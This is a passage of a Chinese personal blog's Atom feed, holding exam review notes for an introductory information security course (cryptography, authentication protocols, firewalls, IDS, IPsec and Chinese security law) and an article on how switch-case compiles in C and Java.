<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>AYu</title>
  
  
  <link href="https://www.fvolcano.red/atom.xml" rel="self"/>
  
  <link href="https://www.fvolcano.red/"/>
  <updated>2021-07-03T23:55:56.000Z</updated>
  <id>https://www.fvolcano.red/</id>
  
  <author>
    <name>AYu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>哈工大信息安全导论复习重点整理</title>
    <link href="https://www.fvolcano.red/2021/HIT-Information-Security-Review/"/>
    <id>https://www.fvolcano.red/2021/HIT-Information-Security-Review/</id>
    <published>2021-07-03T23:55:56.000Z</published>
    <updated>2021-07-03T23:55:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>2021年信息安全导论期末复习使用，根据老师给的重点整理。<a id="more"></a></p><p>2021期末：</p><p>单选：10分（每题2分，共5题）</p><p>填空：10分（每题2分，共5题）</p><p>简答题：30分（6题，每题5分）</p><p>计算题：15分（1题）</p><p>设计题：15分（1题）</p><p>辨析题：20分，每题10分</p><h1 id="1、-信息安全体系架构"><a href="#1、-信息安全体系架构" class="headerlink" title="1、 信息安全体系架构"></a>1、 信息安全体系架构</h1><h3 id="面向目标的知识体系结构"><a href="#面向目标的知识体系结构" class="headerlink" title="面向目标的知识体系结构"></a>面向目标的知识体系结构</h3><p>CIA三元组：机密性、完整性、可用性（正常使用不会被拒绝、可靠及时）</p><p>DAD三元组：泄露、篡改、破坏</p><h3 id="面向应用的层次型技术体系架构"><a href="#面向应用的层次型技术体系架构" class="headerlink" title="面向应用的层次型技术体系架构"></a>面向应用的层次型技术体系架构</h3><p>信息系统的基本要素：人员（管理安全）、信息（内容安全、数据安全）、系统（运行安全、物理安全）</p><h3 id="面向过程的信息安全保障体系"><a href="#面向过程的信息安全保障体系" class="headerlink" title="面向过程的信息安全保障体系"></a>面向过程的信息安全保障体系</h3><p>PDRR：保护、检测、反应、恢复</p><h3 id="OSI开放系统互连安全体系结构"><a href="#OSI开放系统互连安全体系结构" class="headerlink" title="OSI开放系统互连安全体系结构"></a>OSI开放系统互连安全体系结构</h3><p>安全服务</p><ul><li>鉴别服务</li><li>访问控制</li><li>数据机密性</li><li>数据完整性</li><li>抗抵赖性</li></ul><p>安全机制</p><ul><li>加密</li><li>数字签名（完整性和不可否认性）</li><li>访问控制</li><li>数据完整性</li><li>鉴别交换（身份认证）</li><li>业务流填充</li><li>路由控制</li><li>公证控制（第三方）</li></ul><h1 id="2、-密码体制的五要素"><a href="#2、-密码体制的五要素" class="headerlink" title="2、 密码体制的五要素"></a>2、 密码体制的五要素</h1><p>M明文空间 有限集</p><p>C密文空间 有限集</p><p>K密钥空间 一切可能</p><p>E加密算法 任意密钥有效计算</p><p>D解密算法 任意</p><h1 id="3、-仿射密码"><a href="#3、-仿射密码" class="headerlink" title="3、 仿射密码"></a>3、 仿射密码</h1><p>移位密码+乘数密码</p><p>Ek(m) = (k1m+k2)mod q</p><p>Dk(c) = k1^-1(c-k2)mod q</p><p>k1与q=26互素，k1、k2&lt;26</p><p>乘法逆元：k^-1*k mod q = 1</p><h1 id="4、-数据加密标准DES的算法结构和特点"><a href="#4、-数据加密标准DES的算法结构和特点" class="headerlink" title="4、 数据加密标准DES的算法结构和特点"></a>4、 数据加密标准DES的算法结构和特点</h1><p>运算：置换IP IP-1、函数Fk（异或、E/P扩张置换、S盒、置换P4）、密钥移位、SW交换函数（左四右四）、</p><p>特点：分组加密（密钥循环左移来使用）、密钥64（56+8）、加密解密密钥使用顺序相反、密码体制公开（安全性完全依赖于密钥的保密性）、每轮需要48位的密钥（56位计算而来）、被破解（密钥只有56位）、16轮相同运算（fk）</p><p>分组短、密钥短、密码生命周期短、运行速度慢</p><h1 id="5、-公钥密码的思想（数学描述）"><a href="#5、-公钥密码的思想（数学描述）" class="headerlink" title="5、 公钥密码的思想（数学描述）"></a>5、 公钥密码的思想（数学描述）</h1><p>利用单向陷门函数：给x计算y=fx容易；给y计算x困难；存在z，给定z时对于任何y计算x容易。</p><p>满足12为单向函数，3为陷门性，z陷门信息</p><h1 id="6、-离散对数问题"><a href="#6、-离散对数问题" class="headerlink" title="6、 离散对数问题"></a>6、 离散对数问题</h1><p>原根：可以从a的1到p-1次方 mod p得到1到p-1的一个排列；b = a^i mod p (1&lt;=i&lt;=p-1)    i为b的以a为基数模p的离散对数</p><p>已知其他计算b容易；已知其他计算i困难</p><h1 id="7、-Diffie-Hellman密钥交换协议"><a href="#7、-Diffie-Hellman密钥交换协议" class="headerlink" title="7、 Diffie-Hellman密钥交换协议"></a>7、 Diffie-Hellman密钥交换协议</h1><p>DH算法：利用离散对数，各取大数i1、i2，分别计算b传给对方，拿到对方的b再进行一次，结果为密钥。</p><h1 id="8、-RSA公钥算法"><a href="#8、-RSA公钥算法" class="headerlink" title="8、 RSA公钥算法"></a>8、 RSA公钥算法</h1><p>欧拉函数：由小于n且和n互素的正整数构成的元素个数。n = pq   f(n) = (p-1)(q-1)</p><p>欧拉定理：a与n互素，则a^f(n) = 1 mod n</p><p>大整数因子分解：将n分解为两个大素数p、q是困难的</p><p>RSA：分组密码，明文和密文都是0到n之间的整数</p><p>密钥生成：选择素数p、q，n = pq—选择整数e使e与f(n)互素且小于f(n)—计算d = 模f(n)下e的乘法逆元。公钥：e、n；私钥：d、n、p、q</p><p>加密：c = m^e mod n</p><p>解密：m = c^d mod n</p><p>书本P36例子</p><h1 id="9、-散列函数的特点和作用"><a href="#9、-散列函数的特点和作用" class="headerlink" title="9、 散列函数的特点和作用"></a>9、 散列函数的特点和作用</h1><p>将任意长信息映射成固定长散列值（消息摘要）</p><p>特点：弱（给定x难以找到x’ h值相同）、强（自定x，无论是否在X中，包括弱）无碰撞特性、单向性（逆函数求x不可行）</p><p>安全长度：128</p><p>作用：作为认证符，完成消息认证</p><h1 id="10、EMI、EMC、防电磁泄漏主要方法"><a href="#10、EMI、EMC、防电磁泄漏主要方法" class="headerlink" title="10、EMI、EMC、防电磁泄漏主要方法"></a>10、EMI、EMC、防电磁泄漏主要方法</h1><p>EMI：电磁干扰，无关的、不希望有的、不良影响的电磁发射</p><p>EMC：电磁兼容性，电子设备正常工作的电磁环境不与其他电子设备相互不影响</p><ul><li>屏蔽法（空域防护）</li><li>频域法（干扰频率剔除）</li><li>时域法（时间回避）</li></ul><h1 id="11、容错与容灾的概念及主要技术方法"><a href="#11、容错与容灾的概念及主要技术方法" class="headerlink" title="11、容错与容灾的概念及主要技术方法"></a>11、容错与容灾的概念及主要技术方法</h1><p>容错：即使出现错误，系统也能执行一组规定的程序，不会中断或被修改。</p><p>空闲设备（备份）、镜像（一份工作交给两个相同部件）、复现（延迟镜像，原系统和辅助系统）、负载均衡（子任务）</p><p>容灾：对偶然事故的预防和恢复。</p><p>对服务的维护和恢复；保护和恢复信息。</p><p>灾难恢复策略：做最坏打算、充分利用现有资源、注意灾前措施</p><h1 id="12、windows的网络认证"><a href="#12、windows的网络认证" class="headerlink" title="12、windows的网络认证"></a>12、windows的网络认证</h1><p>对称密钥加密、有效注册的合法用户、用户与主域控制器共享口令、在域控制器的安全用户管理数据库中保存用户名和口令的散列。</p><p>登录请求-用户端计算口令散列-域控制器发送8字节质询-两方都用口令散列对质询进行散列计算（加密）得到质询散列-域控制器对比</p><h1 id="13、利用公开密钥和对称密钥设计认证协议获得会话密钥"><a href="#13、利用公开密钥和对称密钥设计认证协议获得会话密钥" class="headerlink" title="13、利用公开密钥和对称密钥设计认证协议获得会话密钥"></a>13、利用公开密钥和对称密钥设计认证协议获得会话密钥</h1><p>对称密钥</p><p>挑战-应答：发送挑战—示证方通过共享密钥加密后发回—验证方通过共享密钥解密</p><p>Needham-S：加入第三方，认证服务器AS，密钥分配中心KDC，<strong>具体过程</strong>书本P58</p><p>Kerberos：AS+票据授予服务器TGS，<strong>具体过程</strong>书本P59</p><p>windows：知识点12</p><p>公开密钥</p><p>Needham-S：双向认证协议。过程：A用B的公钥加密自己的ID和挑战—B用私钥解开，用A的公钥加密发来的挑战和自己的挑战—A用私钥解开，用B的公钥加密B的挑战发回</p><p>基于CA数字证书：CA认证中心，数字证书：经过CA签名（私钥加密）的包含拥有者信息和公钥的文件。过程：申请颁发—使用私钥加密信息发送—接受方获得CA的公钥，用公钥对数字证书做合法性验证—获取发送方的公钥，验证信息的签名。</p><h1 id="14、Kerberos工作原理"><a href="#14、Kerberos工作原理" class="headerlink" title="14、Kerberos工作原理"></a>14、Kerberos工作原理</h1><p>三个阶段：完成身份认证，获得访问TGS的票据—获得访问应用服务器的票据—客户与服务器身份验证交换，获得服务。</p><p>书本P59</p><h1 id="15、PKI的体系结构及工作原理"><a href="#15、PKI的体系结构及工作原理" class="headerlink" title="15、PKI的体系结构及工作原理"></a>15、PKI的体系结构及工作原理</h1><p>体系结构：认证机构CA、证书库（供查询、分布式）、密钥备份及恢复、证书撤销处理（进入黑名单）、PKI应用接口（查询、路径处理、时间戳请求）</p><p>采用数字证书技术来管理公钥，通过第三方可信任机构——CA认证中心将用户公钥和其他信息绑定，用于验证用户身份。</p><h1 id="16、访问控制的概念"><a href="#16、访问控制的概念" class="headerlink" title="16、访问控制的概念"></a>16、访问控制的概念</h1><p>针对越权访问资源的防御措施，从而使系统资源在合法范围内使用。</p><p>基本组成元素：主体、客体、访问控制措施（主体对客体的访问规则集合）</p><h1 id="17、DAC、MAC、RBAC的工作原理及特点"><a href="#17、DAC、MAC、RBAC的工作原理及特点" class="headerlink" title="17、DAC、MAC、RBAC的工作原理及特点"></a>17、DAC、MAC、RBAC的工作原理及特点</h1><p>自主访问控制（三种存储方式，授权其他用户）、强制访问控制（基于多级安全需求、安全级别属性，四种形式）、基于角色（隔离用户和权限，即主体和客体操作，通过饰演不同角色来）</p><p>基本原则：最小特权原则、最小泄露原则、多级安全策略</p><h1 id="18、Windows安全体系结构、活动目录与组策略"><a href="#18、Windows安全体系结构、活动目录与组策略" class="headerlink" title="18、Windows安全体系结构、活动目录与组策略"></a>18、Windows安全体系结构、活动目录与组策略</h1><p>层次性，开始于<strong>用户认证</strong>（最外层），接着<strong>加密和访问控制</strong>，然后为<strong>审计和管理</strong>（系统的安全配置和事故处理），核心为<strong>安全策略</strong>。</p><p>安全主体：用户、组、计算机、域</p><p>安全子系统来提供安全性：服务 身份认证、访问控制、事件审计</p><p>安全参考监视器（SRM）：内核模式、身份认证、检查权限</p><p>本地安全机构（LSA）：用户模式、登录认证</p><p>活动目录：面向网络对象（用户、组、计算机、域、组织单元、安全策略、应用服务器）管理的综合目录服务。数据存储的视图、网络对象的索引集合</p><p>组策略：依据特定的用户或计算机的安全需求定制的安全配置规则。</p><p>针对每个OU指定不同的GP，存储在AD的相关数据库内，可以强制推送实施。</p><h1 id="19、传统病毒、蠕虫、木马的结构原理"><a href="#19、传统病毒、蠕虫、木马的结构原理" class="headerlink" title="19、传统病毒、蠕虫、木马的结构原理"></a>19、传统病毒、蠕虫、木马的结构原理</h1><p>传统：启动模块、传染、破坏   执行感染病毒的文件、传染其他文件</p><p>蠕虫：不需要寄生，计算机为载体网络为攻击对象、共享文件夹邮件恶意网页本地PE格式文件</p><p>木马：控制计算机为目的，下载安装、修改注册表、驻留内存、安装后门程序、设置开机加载，盗号网页点击下载代理，控制端程序+木马程序（服务器端，潜入）+木马配置程序</p><h1 id="20、拒绝服务攻击、缓冲区溢出：举例"><a href="#20、拒绝服务攻击、缓冲区溢出：举例" class="headerlink" title="20、拒绝服务攻击、缓冲区溢出：举例"></a>20、拒绝服务攻击、缓冲区溢出：举例</h1><p>DoS：目标系统某种破坏而不能提供服务。Ping of Death：包长度超过最大65536，TCPIP堆栈崩溃；tear drop：IP包偏移量重叠；Syn Flood：TCP连接不发送最后的ACK包；Smurf攻击：IP地址欺骗和ICMP协议，源地址为受害机广播ICMP ECHO包，源设为广播地址网络堵塞；电子邮件炸弹</p><p>填充的数据超过缓存区容量，覆盖其他数据。C strcpy</p><h1 id="21、防火墙主要技术概述"><a href="#21、防火墙主要技术概述" class="headerlink" title="21、防火墙主要技术概述"></a>21、防火墙主要技术概述</h1><p>包过滤防火墙：面向<strong>网络底层数据流</strong>进行审计和控管   <strong>网络层和传输层</strong></p><p>代理防火墙：基于<strong>代理技术</strong>，使防火墙参与到每一个内外网络之间的连接过程  还原审查后转发   <strong>应用层</strong></p><p>个人防火墙：一种能够保护个人计算机系统安全的<strong>软件</strong></p><p>ACL：一系列允许和拒绝匹配规则的集合（规则的顺序 matters）</p><p>静态包过滤：根据定义好的包过滤规则审查每个数据包   根据数据包的包头信息</p><p>动态包过滤：动态配置包过滤规则  根据需求添加或删除ACL   基于会话</p><p>应用代理网关：<strong>隔断直接的TCP连接</strong>   必须理解新协议、工作量大（<strong>应用层</strong>）</p><p>电路级网关：<strong>传输层</strong>上实施访问控制策略（不需要审计应用层，工作量小），内外网络建立虚拟电路</p><p>NAT：网络地址翻译，<strong>将私有地址转换为合法IP</strong>    解决IP地址不足的问题   静态动态NAT</p><p>VPN：虚拟专用网，穿过公用网络的安全稳定的隧道    隧道技术：一种协议完成另一种协议的数据封装、传输、解封</p><h1 id="22、Netfilter／iptables的工作原理"><a href="#22、Netfilter／iptables的工作原理" class="headerlink" title="22、Netfilter／iptables的工作原理"></a>22、Netfilter／iptables的工作原理</h1><p>两层结构：内核层的Netfilter组件：<strong>信息包过滤表组成</strong>。用户层的IPtables组件：<strong>管理包过滤规则的工具</strong>。</p><p><strong>Netfilter = 表-》链-》规则（存在优先级顺序）</strong>。</p><p>三个功能表：数据包过滤表Filter（input、forward、output三条链）、网络地址转换表Nat、数据包处理表Mangle。具体实现：在网络处理流程的若干位置放置一些钩子hook</p><p>包过滤表中的规则是通过IPtables的命令来进行管理的。</p><p><strong>IPtables命令 = 工作表+使用链+规则操作+目标动作+匹配条件。</strong></p><p>书本P114</p><h1 id="23、基于网络和基于主机的入侵检测系统的优缺点"><a href="#23、基于网络和基于主机的入侵检测系统的优缺点" class="headerlink" title="23、基于网络和基于主机的入侵检测系统的优缺点"></a>23、基于网络和基于主机的入侵检测系统的优缺点</h1><p><strong>基于主机：HIDS</strong>，分析系统的审计数据，数据来源为日志。</p><p>检测准确性高，可及时阻止入侵，性价比高，对网络流量不敏感，适合加密环境；与平台相关，每个主机都要安装，难以检测针对网络的攻击</p><p><strong>基于网络：NIDS</strong>，在网络关键位置部署感应器。</p><p>对用户透明，隐蔽性好，使用简便，不易遭受网络攻击，与平台无关，独立计算机，不会增加负载，攻击者不易转移证据；无法检测来自网络内部的攻击，无法分析加密数据，分析所有网络报文，主机负荷大 DoS</p><h1 id="24、snorts的工作原理"><a href="#24、snorts的工作原理" class="headerlink" title="24、snorts的工作原理"></a>24、snorts的工作原理</h1><p><strong>数据包捕获模块</strong>（原始状态捕获）+<strong>预处理模块</strong>（解码检查相关处理，对基于特征的攻击进行检测）+<strong>检测引擎</strong>（规则分析和特征检测，分析每个包是否存在入侵）+<strong>输出模块</strong>（根据检测的结果输出日志或报警）</p><p>snorts将所有已知的入侵行为以规则的形式存放在规则库中：三位链表结构组织  <strong>规则头（{前内容）+规则选项</strong></p><p>书本P124</p><h1 id="25、IPSEC协议的体系结构"><a href="#25、IPSEC协议的体系结构" class="headerlink" title="25、IPSEC协议的体系结构"></a>25、IPSEC协议的体系结构</h1><p><strong>两个基本协议</strong>：ESP（封装安全有效负荷：加密，可选认证-只是数据）+AH（认证头：认证-整个IP数据包，抗重放）</p><p><strong>四个要件</strong>：加密算法（必须支持DES），认证算法，解释域DOI（安全参数和相关信息的集合），密钥管理（IKE协议）</p><p><strong>安全关联</strong>：SA，是安全参数和策略的集合，定义了两个应用实体间的一个<strong>单向</strong>连接</p><h1 id="26、传输方式和隧道方式的区别"><a href="#26、传输方式和隧道方式的区别" class="headerlink" title="26、传输方式和隧道方式的区别"></a>26、传输方式和隧道方式的区别</h1><p>IPSec操作的不同模式</p><p>传输：在IP头和数据之间插入IPSec头</p><p>隧道：用新IP头和IPSec头将整个IP数据包再一次封装</p><h1 id="27、SSL握手协议"><a href="#27、SSL握手协议" class="headerlink" title="27、SSL握手协议"></a>27、SSL握手协议</h1><p>用于建立会话、协商加密方法、鉴别方法、压缩方法和初始化操作。</p><p>四个阶段：<strong>建立安全能力</strong>（client_hello消息，server_hello，支持的密码算法等）、<strong>服务器认证与密钥交换</strong>（服务器发送自己的证书，key_exchange消息，可以请求客户端证书，server_hello_done）、<strong>客户端认证与密钥交换</strong>（若请求则发送证书，keyexchange，certificateverify）、<strong>结束</strong>（change_cipher_spec通知使用协商好的密码规范，finished检查密钥交换和鉴别是否成功，两方都发送这两个消息）</p><p>书本P148</p><h1 id="28、双重签名DS技术原理"><a href="#28、双重签名DS技术原理" class="headerlink" title="28、双重签名DS技术原理"></a>28、双重签名DS技术原理</h1><p>SET过程中的安全通信，订购信息和支付信息。</p><p><strong>DS = EkRc [H(H(PI) || H(OI))]</strong></p><p>使用：将<strong>DS、OI和PIMD</strong>发送给商家，商家可用顾客的公钥验证DS的真假（计算两个POMD），顾客生成对称密钥，用银行公钥加密，然后用这个密钥加密<strong>DS、PI、OIMD</strong>，将二者通过商家转发给银行，银行同样可以验证DS真假。可以做到隔离信息。</p><p>书本P156</p><h1 id="29、DRM结构原理"><a href="#29、DRM结构原理" class="headerlink" title="29、DRM结构原理"></a>29、DRM结构原理</h1><p>数字版权保护技术：以一定安全算法实现对数字内容的保护。目的是使非法复制变得困难。包括数字表示技术、安全和加密技术、安全存储技术。技术方法：数字水印技术、以数据加密和防复制为核心的DRM技术。</p><p>结构分为<strong>服务器</strong>（管理版权文件的分发和授权，生成被加密的受保护文件并分发给用户）和<strong>客户端</strong>（依据受版权保护文件提供的信息申请授权许可证，解密受保护文件并提供给用户使用）</p><h1 id="30、数字水印的工作原理"><a href="#30、数字水印的工作原理" class="headerlink" title="30、数字水印的工作原理"></a>30、数字水印的工作原理</h1><p>是通过一些算法嵌入到数字产品中的数字信息。分为可见和不可见。</p><p>三个基本方面：<strong>水印的形成</strong>，<strong>水印的嵌入</strong>（与加密类似，分为输入、嵌入处理和输出；输入原始宿主文件、水印信息和密码，嵌入处理主要分析选择嵌入点并嵌入）和<strong>水印的检测</strong>（检测水印是否存在和提取水印信息，分为盲水印检测和非盲水印检测-需不需要原始文件和水印信息）</p><h1 id="31、-cc与bs7799的区别"><a href="#31、-cc与bs7799的区别" class="headerlink" title="31、 cc与bs7799的区别"></a>31、 cc与bs7799的区别</h1><p>信息安全标准   书本P182</p><p>CC：<strong>信息技术安全性评估通用准则</strong>，基础准则，评估信息技术铲平和系统安全性，提倡安全工程思想</p><p>BS7799：<strong>信息安全管理体系标准</strong>，建立、实施和维护信息安全管理体系的要求</p><h1 id="32、风险评估的主要方法"><a href="#32、风险评估的主要方法" class="headerlink" title="32、风险评估的主要方法"></a>32、风险评估的主要方法</h1><p>基线评估（安全基线比较，基线设定难）、详细评估（耗费资源）、组合评估（一次初步评估划分不同评估范围-选择基线or详细）</p><h1 id="33、-网络安全法（非教材）"><a href="#33、-网络安全法（非教材）" class="headerlink" title="33、 网络安全法（非教材）"></a>33、 网络安全法（非教材）</h1><p>《中华人民共和国网络安全法》共有7章79条，不少内容针对近年的网络安全隐患，如个人信息泄露等。该法明确了网络诈骗等行为的定义和刑罚，明确了网络运营商的责任，要求其处置违法信息、配合侦察机关工作等。此法旨在防止网络恐怖袭击、网络诈骗等行为，并赋予了政府在紧急情况下断网等权力。</p><p>此外，该法也首次以法律形式明确<a href="https://www.wikiwand.com/zh-hans/%E4%B8%AD%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%9E%E5%90%8D%E5%88%B6">网络实名制</a>，规定网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。同时也对关键信息基础设施的运行安全以及惩治攻击破坏中国境内关键信息基础设施的境外组织和个人进行明确规定。</p><h1 id="34、等级保护2-0（非教材）"><a href="#34、等级保护2-0（非教材）" class="headerlink" title="34、等级保护2.0（非教材）"></a>34、等级保护2.0（非教材）</h1><p>等保2.0于在<strong>2019年12月1日</strong>开始实施。等保2.0全称网络安全等级保护2.0制度，是我国网络安全领域的基本国策、基本制度。等级保护标准在1.0时代标准的基础上，注重主动防御，从被动防御到事前、事中、事后全流程的安全可信、动态感知和全面审计，实现了对传统信息系统、基础信息网络、云计算、大数据、物联网、移动互联网和工业控制信息系统等级保护对象的全覆盖。</p><p>近年来，随着信息技术的发展和网络安全形势的变化，等保1.0要求已无法有效应对新的安全风险和新技术应用所带来的新威胁，等保1.0被动防御为主的防御无法满足当前发展要求，因此急需建立一套主动防御体系。</p><p><a href="https://www.zhihu.com/question/51443853">https://www.zhihu.com/question/51443853</a></p><h1 id="35、伦理道德"><a href="#35、伦理道德" class="headerlink" title="35、伦理道德"></a>35、伦理道德</h1><p>整体原则（服从整体利益）、兼容原则（被社会接受）、互惠原则（权利义务）</p><p>伤害、干扰、窥探、伪证、盗用</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2021年信息安全导论期末复习使用，根据老师给的重点整理。&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="https://www.fvolcano.red/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>switch-case的底层原理</title>
    <link href="https://www.fvolcano.red/2021/somwthing-about-switchcase/"/>
    <id>https://www.fvolcano.red/2021/somwthing-about-switchcase/</id>
    <published>2021-06-10T01:23:15.000Z</published>
    <updated>2021-06-10T01:23:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>switch语句根据一个整数索引值进行多重分支，底层采用跳转表这种数据结构。本文整理了switch的底层原理与在C和Java中的使用规范。<a id="more"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://blog.csdn.net/Abrazen_zz/article/details/79250450">Switch底层执行原理</a></li><li><a href="https://www.jb51.net/article/169781.htm">JAVA字符串类型switch的底层原理详析</a></li><li><a href="https://www.cnblogs.com/jinggod/p/8425260.html">java基础(六) switch语句的深入解析</a></li></ol><h1 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h1><p>执行switch时生成一个长度最大为case常量＋1的数组，程序首先判断switch变量是否大于最大case 常量，若大于，则跳到default分支处理；否则取得数组索引号为switch变量值大小，取得数组对应值即为相应case代码块地址，程序接着跳到此地址执行，完成分支的跳转。</p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p><img src="/2021/somwthing-about-switchcase/20180204000943759" alt="原C代码"></p><p>对于fall through情况（即case中没有break），采用了分离的方法，将共同的部分放入rest中。</p><p><img src="/2021/somwthing-about-switchcase/20180204002047795" alt="转换演示代码"></p><h1 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h1><p>执行if-else是逐个条件进行判断，直到命中；与if-else语句相比，使用跳转表的优点是执行switch语句的时间与数量无关，且读取switch参数时只读取一次，就可跳到对应分支；缺点是维系了一个连续的数组，实际时使用空间换时间。</p><p>最大值与最小值跨度较大、且之间没有更多的条件情况下，实际申请的很多空间是没用的，这种情况下使用if-else更好。因此编译器会对case的顺序打乱，若case的值比较规律（数据差相同），就汇编成查询表；若各个case值之间非常离散，即无规律可言时，编译器会采取某种优化措施。</p><p>比如1，2，3，4，5，999这种情况也是很常见的，可以去掉最大值，去掉最小值重新测试，或者用二分法，分为2部分重新测试。</p><h1 id="switch支持的类型"><a href="#switch支持的类型" class="headerlink" title="switch支持的类型"></a>switch支持的类型</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (表达式) &#123;</span><br><span class="line">    <span class="keyword">case</span> 常量表达式或枚举常量:</span><br><span class="line">        语句;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> 常量表达式或枚举常量:</span><br><span class="line">        语句;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        ......</span><br><span class="line">            <span class="keyword">default</span>: 语句;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C"><a href="#C" class="headerlink" title="C"></a>C</h2><p>因为要将case值转换为表项i，以及switch值要根据case值转换为对应数组索引，所以switch入参时只支持整形及能够转为整形的数据类型。</p><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p><strong>switch 匹配的表达式可以是：</strong></p><ul><li>byte、short、char、int类型及这4种类型的包装类型；</li><li>枚举类型；</li><li>String 类型；</li></ul><p><strong>case 匹配的表达式可以是：</strong></p><ul><li>常量表达式；</li><li>枚举常量；</li></ul><p>switch 底层是使用 int 型 来进行判断的，即使是枚举、String类型，最终也是转变成 int 型。由于 long 型表示范围大于 int 型，因此<strong>不支持 long 类型</strong>。</p><h1 id="Java中支持String类型的原理"><a href="#Java中支持String类型的原理" class="headerlink" title="Java中支持String类型的原理"></a>Java中支持String类型的原理</h1><p>现在使用的Java的版本，基本上是都支持String类型的。</p><p>例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span></span>&#123;</span><br><span class="line">    String str = <span class="string">&quot;sdf&quot;</span>;</span><br><span class="line">    <span class="keyword">switch</span> (str)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;aaa&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;ccc&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;bbb&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将class文件反编译得到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] var0)</span> </span>&#123;</span><br><span class="line">    String var1 = <span class="string">&quot;sdf&quot;</span>;</span><br><span class="line">    <span class="keyword">byte</span> var3 = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">switch</span>(var1.hashCode()) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">96321</span>:</span><br><span class="line">            <span class="keyword">if</span> (var1.equals(<span class="string">&quot;aaa&quot;</span>)) &#123;</span><br><span class="line">                var3 = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">97314</span>:</span><br><span class="line">            <span class="keyword">if</span> (var1.equals(<span class="string">&quot;bbb&quot;</span>)) &#123;</span><br><span class="line">                var3 = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">98307</span>:</span><br><span class="line">            <span class="keyword">if</span> (var1.equals(<span class="string">&quot;ccc&quot;</span>)) &#123;</span><br><span class="line">                var3 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(var3) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，String类型的switch，转换为了字符串的哈希比较，而其哈希返回的正是int类型。hash相同的情况再通过equals方法对比字符串的值（因为两个不同的字符串 hashCode 是有可能相等的），最后引进局部变量var3再进行跳转。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;switch语句根据一个整数索引值进行多重分支，底层采用跳转表这种数据结构。本文整理了switch的底层原理与在C和Java中的使用规范。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>理解二分法的不同实现</title>
    <link href="https://www.fvolcano.red/2021/how-to-implement-binary-search/"/>
    <id>https://www.fvolcano.red/2021/how-to-implement-binary-search/</id>
